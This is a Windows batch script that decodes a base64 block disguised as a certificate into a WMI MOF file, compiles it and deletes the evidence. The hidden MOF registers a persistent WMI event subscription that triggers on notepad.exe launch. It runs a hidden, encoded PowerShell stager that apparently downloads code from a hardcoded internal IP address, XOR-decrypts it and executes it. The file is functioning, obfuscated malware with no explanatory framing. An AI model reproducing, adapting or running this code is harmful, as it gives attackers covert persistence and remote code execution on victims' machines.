@echo off
certutil -decode "%~f0" bootrun.mof
cd %temp%
start mofcomp.exe %temp%\bootrun.mof
del %temp%\bootrun.mof
exit /b 1

-----BEGIN CERTIFICATE-----
DQojcHJhZ21hIG5hbWVzcGFjZSgiXFxcXC5cXHJvb3RcXHN1YnNjcmlwdGlvbiIp
DQoNCg0KaW5zdGFuY2Ugb2YgX19FdmVudEZpbHRlciBhcyAkRXZlbnRGaWx0ZXIN
CnsNCiAgICBFdmVudE5hbWVzcGFjZSA9ICJSb290XFxDaW12MiI7DQogICAgTmFt
ZSAgPSAiRmlsdGVyIjsNCiAgICBRdWVyeSA9ICJTZWxlY3QgKiBGcm9tIF9fSW5z
dGFuY2VDcmVhdGlvbkV2ZW50IFdpdGhpbiAyIiANCiAgICAgICAgICAgICJXaGVy
ZSBUYXJnZXRJbnN0YW5jZSBJc2EgXCJXaW4zMl9Qcm9jZXNzXCIgIg0KICAgICAg
ICAgICAgIkFuZCBUYXJnZXRpbnN0YW5jZS5OYW1lID0gXCJub3RlcGFkLmV4ZVwi
ICI7DQogICAgUXVlcnlMYW5ndWFnZSA9ICJXUUwiOw0KfTsNCg0KDQppbnN0YW5j
ZSBvZiBDb21tYW5kTGluZUV2ZW50Q29uc3VtZXIgYXMgJENvbnMNCnsNCiAgICBO
YW1lID0gIlBvd2Vyc2hlbGwgSGVscGVyIjsNCiAgICBSdW5JbnRlcmFjdGl2ZWx5
PWZhbHNlOw0KICAgIENvbW1hbmRMaW5lVGVtcGxhdGU9InBvd2Vyc2hlbGwuZXhl
IC1Ob1AgLXN0YSAtTm9uSSAtVyBIaWRkZW4gLUVuYyBXd0JUQUZrQVV3QlVBR1VB
YlFBdUFFNEFSUUJVQUM0QVV3QkZBRklBVmdCSkFFTUFSUUJRQUc4QVNRQnVBRlFB
VFFCQkFHNEFRUUJIQUVVQWNnQmRBRG9BT2dCRkFGZ0FVQUJsQUdNQWRBQXhBREFB
TUFCREFHOEFiZ0JVQUVrQVRnQlZBRVVBSUFBOUFDQUFNQUE3QUNRQWR3QmpBRDBB
VGdCbEFGY0FMUUJQQUVJQVNnQmxBRU1BVkFBZ0FGTUFlUUJUQUhRQVJRQk5BQzRB
VGdCbEFIUUFMZ0JYQUVVQVlnQkRBR3dBU1FCbEFHNEFkQUE3QUNRQWRRQTlBQ2NB
VFFCdkFIb0FhUUJzQUd3QVlRQXZBRFVBTGdBd0FDQUFLQUJYQUdrQWJnQmtBRzhB
ZHdCekFDQUFUZ0JVQUNBQU5nQXVBREVBT3dBZ0FGY0FUd0JYQURZQU5BQTdBQ0FB
VkFCeUFHa0FaQUJsQUc0QWRBQXZBRGNBTGdBd0FEc0FJQUJ5QUhZQU9nQXhBREVB
TGdBd0FDa0FJQUJzQUdrQWF3QmxBQ0FBUndCbEFHTUFhd0J2QUNjQU93QWtBRmNB
UXdBdUFFZ0FaUUJCQUdRQVJRQlNBRk1BTGdCQkFHUUFSQUFvQUNjQVZRQnpBR1VB
Y2dBdEFFRUFad0JsQUc0QWRBQW5BQ3dBSkFCMUFDa0FPd0FrQUhjQVF3QXVBRkFB
Y2dCUEFIZ0FXUUFnQUQwQUlBQmJBRk1BV1FCekFGUUFSUUJOQUM0QVRnQkZBRlFB
TGdCWEFFVUFZZ0JTQUVVQWNRQjFBRVVBY3dCMEFGMEFPZ0E2QUVRQVpRQkdBR0VB
ZFFCTUFIUUFWd0JsQUdJQVVBQlNBRThBZUFCNUFEc0FKQUJYQUVNQUxnQlFBRklB
VHdCNEFIa0FMZ0JEQUZJQVJRQkVBR1VBVGdCVUFHa0FRUUJzQUhNQUlBQTlBQ0FB
V3dCVEFGa0Fjd0JVQUVVQVRRQXVBRTRBUlFCMEFDNEFRd0JTQUVVQVpBQkZBRTRB
VkFCSkFFRUFiQUJEQUVFQVF3Qm9BR1VBWFFBNkFEb0FSQUJsQUdZQVFRQjFBRXdB
VkFCT0FHVUFkQUJYQUU4QWNnQnJBRU1BY2dCbEFHUUFSUUJPQUZRQVNRQkJBRXdB
VXdBN0FDUUFTd0E5QUNjQVpRQXhBREFBWVFCa0FHTUFNd0E1QURRQU9RQmlBR0VB
TlFBNUFHRUFZZ0JpQUdVQU5RQTJBR1VBTUFBMUFEY0FaZ0F5QURBQVpnQTRBRGdB
TXdCbEFDY0FPd0FrQUVrQVBRQXdBRHNBV3dCakFFZ0FRUUJTQUZzQVhRQmRBQ1FB
UWdBOUFDZ0FXd0JqQUVnQVFRQnlBRnNBWFFCZEFDZ0FKQUJYQUdNQUxnQkVBRThB
ZHdCT0FHd0FUd0JCQUVRQVV3QlVBRklBYVFCdUFFY0FLQUFpQUdnQWRBQjBBSEFB
T2dBdkFDOEFNUUE1QURJQUxnQXhBRFlBT0FBdUFERUFNUUF3QUM0QU1RQXlBRGtB
T2dBNEFEQUFPQUF3QUM4QWFRQnVBR1FBWlFCNEFDNEFZUUJ6QUhBQUlnQXBBQ2tB
S1FCOEFDVUFld0FrQUY4QUxRQkNBRmdBYndCeUFDUUFTd0JiQUNRQVNRQXJBQ3NB
SlFBa0FHc0FMZ0JNQUdVQWJnQm5BRlFBYUFCZEFIMEFPd0JKQUVVQVdBQWdBQ2dB
SkFCQ0FDMEFTZ0JQQUdrQVRnQW5BQ2NBS1FBPSI7DQp9Ow0KDQoNCmluc3RhbmNl
IG9mIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcNCnsNCiAgICBDb25zdW1lciAg
ID0gJENvbnM7DQogICAgRmlsdGVyID0gJEV2ZW50RmlsdGVyOw0KfTsgDQoNCg==
-----END CERTIFICATE-----
